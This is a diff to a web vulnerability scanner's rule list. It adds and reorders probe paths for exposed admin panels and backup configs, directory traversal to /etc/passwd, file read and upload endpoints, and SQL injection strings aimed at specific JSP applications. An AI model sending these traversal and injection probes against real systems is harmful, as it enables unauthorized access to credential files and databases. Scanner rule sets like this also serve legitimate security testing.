@@ -141,8 +141,7 @@
 /phpmyadmin2015/index.php    {tag="phpMyAdmin"}    {status=200}
 /dbadmin/index.php           {tag="phpMyAdmin"}    {status=200}
 /%20../web-inf/  {severity=2}
-/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20database%28%29; {status=200}
-/epp/detail/publishinfodetail.jsp?pk_message=1002A31000000000BS0X'  {severity=2}
+
 # Directory traversal
 /../../../../../../../../../../../../../etc/passwd  {tag="root:x:"}
 //../../../../../../../../../../../../../etc/passwd {tag="root:x:"}
@@ -155,8 +154,12 @@
 //././././././././././././././././././././././././../../../../../../../../etc/passwd              {tag="root:x:"}
 /etc/passwd    {tag="root:x:"}
 /etc/hosts     {tag="localhost"}
+/file/Placard/upload/Imo_DownLoadUI.php?cid=1&uid=1&type=1&filename=/../../../../etc/passwd {tag="root:x:"}
+#file read
+/dynamic/download.jsp?path=/dynamic/download.jsp {severity=2}
+#file upload
 
-
+//softwarer/bbs/uptest.asp {severity=2}
 # Discuz!
 /config/config_ucenter.php.bak         {status=200}
 /bbs/config/config_ucenter.php.bak     {status=200}
@@ -455,3 +458,13 @@
 /sftp-config.json	     {status=200}    {type_no="html"}   {tag="password"}
 /memadmin/index.php	     {status=200}    {tag="MemAdmin"}
 /login			     {status=200}    {tag="<title>Jenkins</title>"}
+
+
+#sql inject
+/messages_list/&categoryType=forMember&messagesCategoryId=5*.html {severity=2}
+/yyoa/common/js/menu/test.jsp?doType=101&S1=select%20database%28%29; {status=200}
+/epp/detail/publishinfodetail.jsp?pk_message=1002A31000000000BS0X'  {severity=2}
+/web/WebSearchDsp.jsp?key=1 {severity=2}
+/web/careerapply/HrmCareerApplyPerView.jsp?id=1  {severity=2}
+
+
